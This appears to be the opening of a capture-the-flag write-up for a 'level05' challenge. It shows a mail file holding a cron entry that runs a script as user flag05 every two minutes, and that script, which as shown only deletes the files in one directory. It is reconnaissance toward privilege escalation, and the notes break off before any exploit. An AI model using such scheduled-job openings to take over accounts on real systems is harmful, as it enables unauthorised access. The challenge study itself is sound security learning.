cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

it is a cron instruction that launch the script openarenaserver as flag05 every two minutes.
we check the scritp :

#!/bin/sh

for i in /opt/openarenaserver/* ; do

        rm -f "$i"
done
